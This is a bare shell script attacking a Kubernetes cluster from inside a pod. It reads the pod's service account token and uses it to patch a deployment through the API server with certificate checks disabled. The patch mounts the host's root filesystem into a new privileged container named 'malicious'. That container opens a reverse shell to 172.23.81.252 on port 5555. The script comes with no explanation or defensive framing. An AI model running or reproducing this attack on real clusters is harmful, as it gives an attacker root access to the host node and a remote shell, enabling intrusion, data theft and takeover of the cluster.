TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
DEPLOYMENT_NAME="pod-manager-deployment"

curl -v -k \
-X PATCH \
"$API_SERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments/$DEPLOYMENT_NAME" \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json-patch+json" \
-d '[
  {
    "op": "add",
    "path": "/spec/template/spec/volumes/-",
    "value": {
      "name": "hostvolume",
      "hostPath": {
        "path": "/"
      }
    }
  },
  {
    "op": "add",
    "path": "/spec/template/spec/containers/-",
    "value": {
      "name": "malicious",
      "image": "ubuntu",
      "command": [
        "bash",
        "-c",
        "bash -i >& /dev/tcp/172.23.81.252/5555 0>&1"
      ],
      "securityContext": {
        "privileged": true
      },
      "volumeMounts": [
        {
          "mountPath": "/mnt",
          "name": "hostvolume",
          "mountPropagation": "Bidirectional"
        }
      ]
    }
  }
]'
